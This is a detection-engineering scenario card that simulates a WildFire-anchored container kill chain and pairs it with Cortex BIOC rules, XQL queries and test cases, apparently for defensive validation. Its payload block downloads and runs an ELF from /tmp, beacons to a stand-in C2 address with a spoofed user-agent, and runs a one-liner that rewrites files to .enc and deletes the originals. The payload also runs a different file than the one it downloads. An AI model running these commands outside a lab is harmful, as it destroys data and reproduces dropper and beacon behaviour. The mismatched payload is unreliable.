identity.name: WildFire Malware Trigger — Dropped Backdoor, C2 Beacon, Ransomware Sim (T1105)
identity.summary: A compromised container downloads a WildFire test/known-bad ELF, executes the dropped binary from /tmp under a service identity, beacons to a C2 test endpoint on a fixed interval, then performs ransomware-style bulk file rename to .enc. WildFire returns a malicious verdict on the dropped file while Cortex Cloud runtime defense and XDR container BIOCs flag the download-then-execute chain, the pe…
identity.description: WildFire is Palo Alto Networks' cloud-delivered malware-analysis engine: it detonates unknown files and returns verdicts that propagate to the NGFW, XDR, and Cortex Cloud. This scenario validates the full WildFire-anchored kill chain inside a container without using live malware — it fetches the WildFire public ELF test file (and synthesizes a deterministic known-bad ELF), executes the dropped binary from /tmp under the www-data identity, issues three timed HTTP beacons to a TEST-NET-1 (192.0.2.0/24) C2 endpoint with a spoofed user-agent, and runs a safe XOR-based bulk rename of staged files to .enc to mimic ransomware impact. The detection approach combines WildFire's file verdict with container-context behavioral analysis: Cortex flags the executable download-and-chmod pattern, the execution of a downloaded /tmp binary by a service account, the regular periodic outbound HTTP beacon, and the post-execution mass .enc rename. A correlation rule fuses the download, execution, beacon, and encryption stages from one container into a single high-severity malware incident, demonstrating WildFire + runtime + XSIAM stitching.

techniques.name: Command and Scripting Interpreter: Unix Shell

execution.framework_reference_id: T1105 — WildFire test-file download, dropped-binary execution, C2 beacon, and ransomware-style bulk rename inside a container.

prerequisites.description: Cortex Cloud runtime defender (or Cortex XDR Linux agent) installed and reporting; WildFire integration enabled for file verdicts.
prerequisites.check_command: systemctl is-active cortex-agent || ps aux | grep -i defender

prerequisites.description: Lab environment matching scenario SIM-CDR-005 — container with curl/python3 available and outbound egress to the WildFire test endpoint (lab only). C2 target is TEST-NET-1 (192.0.2.0/24).

payload.code:
# WildFire-anchored malware kill chain — synthetic ELF + TEST-NET C2, safe XOR rename (no real encryption).
mkdir -p /tmp/wf_sim && curl -sSL https://wildfire.paloaltonetworks.com/publicapi/test/elf -o /tmp/wf_sim/wildfire_test.elf; chmod +x /tmp/wf_sim/test_backdoor.elf 2>/dev/null
timeout 5 /tmp/wf_sim/test_backdoor.elf 2>/dev/null
for i in 1 2 3; do curl -sSA 'Mozilla/5.0 (compatible; MSIE 9.0)' --connect-timeout 3 "http://192.0.2.1/beacon?id=SIM-CDR-005&seq=${i}" 2>/dev/null; sleep 2; done
# safe XOR rename to .enc — CortexSim safety: not real ransomware
python3 -c "import os,base64;d='/tmp/wf_sim/targets';[open(os.path.join(d,f)+'.enc','wb').write(base64.b64encode(bytes(b^0xAA for b in open(os.path.join(d,f),'rb').read()))) or os.remove(os.path.join(d,f)) for f in os.listdir(d)]"

expected_artifacts.description: WildFire test/known-bad ELF downloaded to /tmp inside a container.
Dropped ELF executed from /tmp by a service account.
Periodic outbound HTTP beacon to a TEST-NET-1 C2 endpoint.
Bulk file rename to .enc following execution (ransomware simulation).

iocs.context: TEST-NET-1 C2 beacon endpoint used by the simulation — stands in for a malware callback host.
Spoofed legacy user-agent string sent by the simulated C2 beacon.

biocs.name: CDR-005 WildFire Known Bad ELF Download In Container
biocs.description: WildFire test file download in container — known-bad file signature matched by WildFire cloud intelligence. A container process downloads an ELF that WildFire verdicts as malicious.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name in ("curl", "wget")
| filter action_process_image_command_line contains_any (".elf", "wildfire.paloaltonetworks.com", "publicapi/test")

biocs.name: CDR-005 Executable Downloaded To Tmp And Made Executable In Container
biocs.description: Executable file downloaded to /tmp and made executable — download-then-execute pattern in container. A binary lands in /tmp and is immediately chmod +x within the same container lineage.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name = "chmod"
| filter action_process_image_command_line contains "/tmp/"
| filter action_process_image_command_line contains_any ("+x", "0755", "755")

biocs.name: CDR-005 WildFire ELF Execution In Container
biocs.description: WildFire test file execution — malicious ELF execution in container triggers CDR BIOC rule. The downloaded ELF binary is executed from /tmp inside the container.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_path contains "/tmp/"
| filter actor_process_image_path contains_any (".elf", "test_backdoor", "wf_sim")

biocs.name: CDR-005 Downloaded Binary Executed By Service Account In Container
biocs.description: Downloaded binary executed from /tmp by www-data context — high-risk execution chain in container. A service identity executes a binary that originated from a download into /tmp.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_path contains "/tmp/"
| filter actor_effective_username in ("www-data", "nobody", "node", "apache", "nginx")

biocs.name: CDR-005 Periodic Outbound HTTP Beacon From Container
biocs.description: Regular periodic outbound HTTP connections from container — C2 beacon interval pattern (3 attempts to 192.0.2.1). A container process makes repeated timed HTTP requests to a single external host.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.NETWORK
| filter container_id != null
| filter dst_action_external_hostname = "192.0.2.1" or action_remote_ip = "192.0.2.1"
| filter dst_action_external_port = 80
| comp count() as beacon_count by container_id, action_remote_ip
| filter beacon_count >= 2

biocs.name: CDR-005 Post Execution C2 Network Activity In Container
biocs.description: C2 communication pattern following malware execution — post-execution network activity in container. Outbound network activity originates from a curl process spawned in the same container that executed the dropped binary.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_name = "curl"
| filter action_process_image_command_line contains "192.0.2.1"
| filter action_process_image_command_line contains_any ("beacon", "User-Agent", "-A ", "MSIE")

biocs.name: CDR-005 Mass File Modification Ransomware Pattern In Container
biocs.description: Mass file modification pattern in container — ransomware-style encryption simulation matches T1486 behavioral rule. A burst of file writes/removes in a single directory mimics ransomware impact.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.FILE
| filter container_id != null
| filter event_sub_type in (ENUM.FILE_CREATE, ENUM.FILE_REMOVE, ENUM.FILE_RENAME)
| comp count() as file_ops by container_id, causality_actor_process_instance_id
| filter file_ops >= 5

biocs.name: CDR-005 Bulk Enc Extension Rename After Execution In Container
biocs.description: Bulk file rename with .enc extension following malware execution — post-execution encryption behavior in container. Multiple files acquire a .enc extension shortly after the dropped binary runs.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.FILE
| filter event_sub_type = ENUM.FILE_CREATE
| filter container_id != null
| filter action_file_extension = "enc"
| comp count() as enc_files by container_id
| filter enc_files >= 3

xql_queries.name: CDR-005 Validate Dropped ELF Execution In Container
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter container_id != null
| filter actor_process_image_path contains "/tmp/" and actor_process_image_path contains_any (".elf", "wf_sim", "test_backdoor")
| fields _time, agent_hostname, container_id, actor_effective_username, actor_process_image_path, action_process_image_command_line

xql_queries.name: CDR-005 Validate C2 Beacon To Test Net Endpoint
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.NETWORK
| filter container_id != null
| filter action_remote_ip = "192.0.2.1" or dst_action_external_hostname = "192.0.2.1"
| fields _time, agent_hostname, container_id, action_remote_ip, dst_action_external_port

xql_queries.name: CDR-005 Validate Bulk Enc Rename In Container
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.FILE and event_sub_type = ENUM.FILE_CREATE
| filter container_id != null
| filter action_file_extension = "enc"
| fields _time, agent_hostname, container_id, actor_process_image_name, action_file_path

correlation_rules.name: WildFire Malware Kill Chain — Download Execute Beacon Encrypt
correlation_rules.logic: BIOC(CDR-005 WildFire Known Bad ELF Download In Container) OR BIOC(CDR-005 WildFire ELF Execution In Container) OR BIOC(CDR-005 Downloaded Binary Executed By Service Account In Container) OR BIOC(CDR-005 Periodic Outbound HTTP Beacon From Container) OR BIOC(CDR-005 Post Execution C2 Network Activity In Container) OR BIOC(CDR-005 Mass File Modification Ransomware Pattern In Container) OR BIOC(CDR-005 Bulk Enc Extension Rename After Execution In Container)

analytics_modules: Advanced WildFire — Malicious file verdict on the dropped ELF
Cortex Cloud Runtime Defense — Dropped binary execution and post-execution C2 beacon
Cortex XDR Analytics — Download-execute-beacon-encrypt behavioral cluster in container

products.evidence_query: WildFire returns a Malicious verdict on the dropped ELF (SHA256) and propagates it to XDR and Cortex Cloud.
preset = xdr_data | filter container_id != null | filter actor_process_image_path contains "/tmp/" | fields _time, container_id, actor_process_image_path
preset = xdr_data | filter action_file_extension = "enc" | fields _time, container_id, action_file_path
Correlation CR-CDR-0005 fuses the WildFire download, dropped-binary execution, C2 beacon, and mass .enc rename from one container into a single malware incident.

use_cases.name: WildFire Cloud Intelligence Validation — Malware Kill Chain
use_cases.description: Validate WildFire file verdicts and stitch the download → execute → beacon → encrypt malware chain inside a container.

test_cases.objective: WildFire verdicts the dropped ELF and the runtime BIOCs fire for execution and beacon.
preconditions: Cortex Cloud runtime defender or Cortex XDR Linux agent >= 8.4.0 reporting on the node.
WildFire integration enabled; BIOCs from this card imported and enabled.
steps: Run SIM-CDR-005 steps 1-4 inside the lab container.
Observe the WildFire verdict and BIOC alerts per stage in the Cortex console.
success_criteria: WildFire returns a Malicious verdict on the dropped ELF.
BIOC `CDR-005 WildFire ELF Execution In Container` and `CDR-005 Periodic Outbound HTTP Beacon From Container` fire within 60s.
All three XQL validation queries return >= 1 row.

test_cases.objective: Download/execute/beacon/encrypt stages stitch into one malware incident.
success_criteria: Correlation `CR-CDR-0005` groups the stages from one container_id into one incident.

preventive_controls: Enable Advanced WildFire inline verdicts on the NGFW and Cortex Cloud so malicious downloads are blocked before execution.
Run containers with a read-only root filesystem so /tmp binaries cannot be made executable.
Enforce default-deny egress so C2 beacons to external hosts fail.
Enable Cortex XDR anti-ransomware behavioral protection in Block mode on workloads.
detection_engineering: Alert on execution of any binary that originated from a /tmp download, especially by a service account.
Alert on regular periodic outbound HTTP from a container to a single external host (beacon interval).
Hunt for bulk .enc renames or mass file create/remove bursts following a recent process execution.

references.title: Unit42 - WildFire Cloud-Delivered Security Prevents Never-Before-Seen Malware
MITRE ATT&CK T1105 — Ingress Tool Transfer
